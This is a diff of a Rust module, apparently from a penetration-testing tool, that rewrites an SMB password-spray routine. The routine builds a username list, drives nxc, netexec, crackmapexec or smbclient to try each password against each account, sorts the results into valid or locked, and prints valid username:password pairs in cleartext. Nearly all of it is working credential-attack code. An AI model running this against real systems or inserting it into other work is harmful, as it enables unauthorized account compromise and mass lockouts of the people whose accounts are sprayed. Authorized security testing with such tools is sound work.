@@ -1,299 +1,256 @@
 use anyhow::Result;
-use std::collections::HashSet;
-use std::io::ErrorKind;
+use std::time::Duration;
 use tokio::process::Command;
-use tokio::time::{sleep, timeout, Duration};
+use tokio::time::{sleep, timeout};
 
-use crate::auth_recon::AuthFinding;
-use crate::output;
+use crate::types::{Finding, ModuleResult, Severity, StageTimer};
+use crate::ui;
 
-pub async fn run_smb_password_spray(
+/// Run SMB password spray against collected users.
+pub async fn run(
     target: &str,
-    domain: Option<&str>,
-    spray_password: &str,
-    explicit_user: Option<&str>,
-    discovered_users: &[String],
-    userlist_path: Option<&str>,
+    domain: &str,
+    passwords: &[String],
+    collected_users: &[String],
+    user_file: Option<&str>,
     max_users: usize,
     delay_ms: u64,
-) -> Result<Vec<AuthFinding>> {
-    output::section("PASSWORD SPRAY");
-    output::info("Attempting SMB password spray with explicit operator-supplied password");
+    non_interactive: bool,
+) -> Result<ModuleResult> {
+    ui::section("PASSWORD SPRAY");
+    let timer = StageTimer::start();
+    let mut result = ModuleResult::new("spray");
 
-    let users = build_user_list(explicit_user, discovered_users, userlist_path, max_users).await?;
-    if users.is_empty() {
-        output::warning("Password spray skipped: no candidate usernames available");
-        return Ok(Vec::new());
-    }
+    // Build user list
+    let mut users: Vec<String> = collected_users
+        .iter()
+        .filter(|u| !u.ends_with('$') && !u.eq_ignore_ascii_case("krbtgt"))
+        .cloned()
+        .collect();
 
-    output::warning(&format!(
-        "Spraying {} users against {} over SMB. Validate lockout policy before reuse.",
-        users.len(),
-        target
-    ));
-
-    let mut findings = Vec::new();
-    let mut successes = Vec::new();
-    let mut found_tool = false;
-
-    for (idx, user) in users.iter().enumerate() {
-        match try_smb_login(target, domain, user, spray_password).await {
-            SprayAttempt::Success => {
-                found_tool = true;
-                output::success(&format!("VALID SMB LOGIN: {}", user));
-                successes.push(user.clone());
-            }
-            SprayAttempt::Invalid => {
-                found_tool = true;
-            }
-            SprayAttempt::Locked => {
-                found_tool = true;
-                output::warning(&format!("Potential lockout/disabled response for {}", user));
-            }
-            SprayAttempt::ToolMissing => {
-                output::warning(
-                    "No spray-capable backend found (tried: nxc, netexec, crackmapexec, smbclient)",
-                );
-                return Ok(Vec::new());
-            }
-            SprayAttempt::Other(detail) => {
-                found_tool = true;
-                output::kv("Spray Error", &format!("{}: {}", user, detail));
-            }
-        }
-
-        if delay_ms > 0 && idx + 1 < users.len() {
-            sleep(Duration::from_millis(delay_ms)).await;
-        }
-    }
-
-    if !found_tool {
-        output::warning("Password spray could not execute because SMB tooling was unavailable");
-        return Ok(findings);
-    }
-
-    if successes.is_empty() {
-        output::warning("Password spray completed with no confirmed SMB logins");
-    } else {
-        let evidence = successes.join(", ");
-        findings.push(AuthFinding {
-            id: "SPRAY-SMB-SUCCESS".to_string(),
-            severity: "high".to_string(),
-            title: "Password spray identified valid SMB credentials".to_string(),
-            evidence,
-            recommendation:
-                "Reset exposed credentials if unauthorized and review lockout/MFA controls."
-                    .to_string(),
-        });
-    }
-
-    Ok(findings)
-}
-
-async fn build_user_list(
-    explicit_user: Option<&str>,
-    discovered_users: &[String],
-    userlist_path: Option<&str>,
-    max_users: usize,
-) -> Result<Vec<String>> {
-    let mut users = Vec::new();
-
-    if let Some(user) = explicit_user {
-        users.push(normalize_user(user));
-    }
-    users.extend(discovered_users.iter().map(|u| normalize_user(u)));
-
-    if let Some(path) = userlist_path {
-        let content = tokio::fs::read_to_string(path).await?;
-        users.extend(
-            content
+    // Add from file
+    if let Some(path) = user_file {
+        if let Ok(content) = tokio::fs::read_to_string(path).await {
+            let file_users: Vec<String> = content
                 .lines()
-                .map(str::trim)
                 .filter(|l| !l.is_empty())
-                .map(normalize_user),
-        );
+                .map(String::from)
+                .collect();
+            users.extend(file_users);
+        }
     }
 
-    let mut seen = HashSet::new();
-    users.retain(|u| {
-        !u.is_empty()
-            && !u.ends_with('$')
-            && !u.eq_ignore_ascii_case("krbtgt")
-            && seen.insert(u.to_ascii_lowercase())
-    });
-    users.sort_by_key(|u| u.to_ascii_lowercase());
+    // Deduplicate
+    users.sort_by_key(|u| u.to_lowercase());
+    users.dedup_by(|a, b| a.to_lowercase() == b.to_lowercase());
+
+    if users.is_empty() {
+        ui::warning("No users available for password spray");
+        result = result.skipped("no users");
+        return Ok(result);
+    }
+
+    // Limit users
     if users.len() > max_users {
+        ui::warning(&format!(
+            "Limiting spray to {} users (from {})",
+            max_users,
+            users.len()
+        ));
         users.truncate(max_users);
     }
-    Ok(users)
+
+    if passwords.is_empty() {
+        ui::warning("No passwords specified for spray");
+        result = result.skipped("no passwords");
+        return Ok(result);
+    }
+
+    if !non_interactive {
+        let confirm = dialoguer::Confirm::new()
+            .with_prompt(&format!(
+                "  Spray {} password(s) against {} user(s)?",
+                passwords.len(),
+                users.len()
+            ))
+            .default(false)
+            .interact_opt()
+            .unwrap_or(Some(false))
+            .unwrap_or(false);
+        if !confirm {
+            result = result.skipped("user declined");
+            return Ok(result);
+        }
+    }
+
+    let total = users.len() * passwords.len();
+    let pb = ui::progress_bar(total as u64, "SPRAY");
+
+    let mut valid_creds = Vec::new();
+    let mut locked_accounts = Vec::new();
+
+    for password in passwords {
+        ui::info(&format!("Spraying password: {}", mask_password(password)));
+
+        for user in &users {
+            pb.inc(1);
+            pb.set_message(format!("{}:{}", user, mask_password(password)));
+
+            match try_smb_login(target, domain, user, password).await {
+                LoginResult::Success => {
+                    pb.println(format!("  [+] VALID: {}:{}", user, password));
+                    valid_creds.push(format!("{}:{}", user, password));
+                }
+                LoginResult::Locked => {
+                    pb.println(format!("  [!] LOCKED: {}", user));
+                    locked_accounts.push(user.clone());
+                }
+                LoginResult::Invalid => {}
+                LoginResult::Error(e) => {
+                    pb.println(format!("  [-] ERROR for {}: {}", user, e));
+                }
+            }
+
+            if delay_ms > 0 {
+                sleep(Duration::from_millis(delay_ms)).await;
+            }
+        }
+    }
+
+    pb.finish_and_clear();
+
+    // Report results
+    if !valid_creds.is_empty() {
+        ui::success(&format!("{} valid credential(s) found!", valid_creds.len()));
+        for cred in &valid_creds {
+            ui::kv("  Valid", cred);
+        }
+        let finding = Finding::new(
+            "spray",
+            "SPRAY-001",
+            Severity::Critical,
+            &format!("{} valid credentials via password spray", valid_creds.len()),
+        )
+        .with_description("Password spray attack discovered valid credentials")
+        .with_evidence(&valid_creds.join("\n"))
+        .with_recommendation("Enforce strong, unique passwords; implement account lockout policies; deploy MFA")
+        .with_mitre("T1110.003");
+        result.findings.push(finding);
+    } else {
+        ui::info("No valid credentials found");
+    }
+
+    if !locked_accounts.is_empty() {
+        ui::warning(&format!("{} account(s) locked out", locked_accounts.len()));
+    }
+
+    ui::stage_done(
+        "SPRAY",
+        &format!("{} tested, {} valid", total, valid_creds.len()),
+        &timer.elapsed_pretty(),
+    );
+
+    result = result.success(timer.elapsed());
+    Ok(result)
 }
 
-fn normalize_user(user: &str) -> String {
-    user.trim()
-        .trim_end_matches('$')
-        .split('@')
-        .next()
-        .unwrap_or(user)
-        .rsplit('\\')
-        .next()
-        .unwrap_or(user)
-        .trim()
-        .to_string()
-}
+// ── SMB login attempt ───────────────────────────────────────────────────────
 
-enum SprayAttempt {
+enum LoginResult {
     Success,
     Invalid,
     Locked,
-    ToolMissing,
-    Other(String),
+    Error(String),
 }
 
-async fn try_smb_login(
-    target: &str,
-    domain: Option<&str>,
-    username: &str,
-    password: &str,
-) -> SprayAttempt {
-    let mut saw_backend = false;
-    let mut last_other: Option<String> = None;
+async fn try_smb_login(target: &str, domain: &str, user: &str, password: &str) -> LoginResult {
+    let tools = ["nxc", "netexec", "crackmapexec"];
 
-    for bin in ["nxc", "netexec", "crackmapexec"] {
-        match try_cme_style_login(bin, target, domain, username, password).await {
-            SprayAttempt::ToolMissing => continue,
-            SprayAttempt::Other(detail) => {
-                saw_backend = true;
-                last_other = Some(format!("{}: {}", bin, detail));
-                continue;
+    for tool in tools {
+        let out = timeout(
+            Duration::from_secs(10),
+            Command::new(tool)
+                .args([
+                    "smb",
+                    target,
+                    "-d",
+                    domain,
+                    "-u",
+                    user,
+                    "-p",
+                    password,
+                ])
+                .output(),
+        )
+        .await;
+
+        match out {
+            Ok(Ok(output)) => {
+                let raw_stdout = String::from_utf8_lossy(&output.stdout);
+                let raw_stderr = String::from_utf8_lossy(&output.stderr);
+                ui::verbose_output(tool, &raw_stdout);
+                ui::verbose_output(tool, &raw_stderr);
+                let stdout = raw_stdout.to_lowercase();
+                let stderr = raw_stderr.to_lowercase();
+                let combined = format!("{}\n{}", stdout, stderr);
+
+                if combined.contains("pwn3d") || combined.contains("[+]") && combined.contains(&user.to_lowercase()) {
+                    return LoginResult::Success;
+                } else if combined.contains("account_locked") || combined.contains("account_disabled") {
+                    return LoginResult::Locked;
+                } else {
+                    return LoginResult::Invalid;
+                }
             }
-            result => return result,
+            Ok(Err(_)) => continue, // Tool not found
+            Err(_) => return LoginResult::Error("timeout".to_string()),
         }
     }
 
-    match try_smbclient_login(target, domain, username, password).await {
-        SprayAttempt::ToolMissing if saw_backend => {
-            SprayAttempt::Other(last_other.unwrap_or_else(|| "backend error".to_string()))
-        }
-        SprayAttempt::ToolMissing => SprayAttempt::ToolMissing,
-        SprayAttempt::Other(detail) => {
-            if let Some(prev) = last_other {
-                SprayAttempt::Other(format!("{} | smbclient: {}", prev, detail))
-            } else {
-                SprayAttempt::Other(detail)
-            }
-        }
-        result => result,
-    }
-}
-
-async fn try_cme_style_login(
-    bin: &str,
-    target: &str,
-    domain: Option<&str>,
-    username: &str,
-    password: &str,
-) -> SprayAttempt {
-    let mut cmd = Command::new(bin);
-    cmd.arg("smb")
-        .arg(target)
-        .arg("-u")
-        .arg(username)
-        .arg("-p")
-        .arg(password);
-    if let Some(domain) = domain {
-        cmd.arg("-d").arg(domain);
-    }
-
-    let out = match timeout(Duration::from_secs(15), cmd.output()).await {
-        Err(_) => return SprayAttempt::Other("timed out".to_string()),
-        Ok(Err(e)) if e.kind() == ErrorKind::NotFound => return SprayAttempt::ToolMissing,
-        Ok(Err(e)) => return SprayAttempt::Other(e.to_string()),
-        Ok(Ok(out)) => out,
-    };
-
-    classify_merged_output(
-        &String::from_utf8_lossy(&out.stdout),
-        &String::from_utf8_lossy(&out.stderr),
-        username,
-    )
-}
-
-async fn try_smbclient_login(
-    target: &str,
-    domain: Option<&str>,
-    username: &str,
-    password: &str,
-) -> SprayAttempt {
-    let mut cmd = Command::new("smbclient");
-    cmd.arg("-g")
-        .arg("-L")
-        .arg(format!("//{}", target))
-        .arg("-U")
-        .arg(format!("{}%{}", username, password));
-    if let Some(domain) = domain {
-        cmd.arg("-W").arg(domain);
-    }
-
-    let out = match timeout(Duration::from_secs(12), cmd.output()).await {
-        Err(_) => return SprayAttempt::Other("timed out".to_string()),
-        Ok(Err(e)) if e.kind() == ErrorKind::NotFound => return SprayAttempt::ToolMissing,
-        Ok(Err(e)) => return SprayAttempt::Other(e.to_string()),
-        Ok(Ok(out)) => out,
-    };
-
-    if out.status.success() {
-        return SprayAttempt::Success;
-    }
-
-    classify_merged_output(
-        &String::from_utf8_lossy(&out.stdout),
-        &String::from_utf8_lossy(&out.stderr),
-        username,
-    )
-}
-
-fn classify_merged_output(stdout: &str, stderr: &str, username: &str) -> SprayAttempt {
-    let combined = format!(
-        "{} {}",
-        stderr.to_ascii_lowercase(),
-        stdout.to_ascii_lowercase()
+    // Fallback: smbclient
+    let user_arg = format!(
+        "{}\\{}%{}",
+        domain.split('.').next().unwrap_or(domain),
+        user,
+        password
     );
-    let user = username.to_ascii_lowercase();
+    let out = timeout(
+        Duration::from_secs(10),
+        Command::new("smbclient")
+            .args(["-L", target, "-U", &user_arg])
+            .output(),
+    )
+    .await;
 
-    if combined.contains("account locked")
-        || combined.contains("account disabled")
-        || combined.contains("password must change")
-        || combined.contains("status_account_locked_out")
-    {
-        return SprayAttempt::Locked;
+    match out {
+        Ok(Ok(output)) => {
+            let combined = format!(
+                "{}\n{}",
+                String::from_utf8_lossy(&output.stdout),
+                String::from_utf8_lossy(&output.stderr)
+            )
+            .to_lowercase();
+
+            if combined.contains("sharename") || combined.contains("ipc$") {
+                LoginResult::Success
+            } else if combined.contains("account_locked") {
+                LoginResult::Locked
+            } else {
+                LoginResult::Invalid
+            }
+        }
+        _ => LoginResult::Error("no compatible tool".to_string()),
     }
-
-    if combined.contains("logon failure")
-        || combined.contains("status_logon_failure")
-        || combined.contains("wrong password")
-        || combined.contains("access denied")
-    {
-        return SprayAttempt::Invalid;
-    }
-
-    if combined.contains("pwn3d")
-        || combined.contains("status_success")
-        || (combined.contains("[+]") && combined.contains(&user))
-    {
-        return SprayAttempt::Success;
-    }
-
-    SprayAttempt::Other(combined.trim().to_string())
 }
 
-#[cfg(test)]
-mod tests {
-    use super::normalize_user;
-
-    #[test]
-    fn normalizes_common_username_forms() {
-        assert_eq!(normalize_user("CORP\\alice"), "alice");
-        assert_eq!(normalize_user("alice@corp.local"), "alice");
-        assert_eq!(normalize_user("dc01$"), "dc01");
+fn mask_password(p: &str) -> String {
+    if p.len() <= 2 {
+        "*".repeat(p.len())
+    } else {
+        format!("{}{}{}",
+            &p[..1],
+            "*".repeat(p.len() - 2),
+            &p[p.len()-1..]
+        )
     }
 }
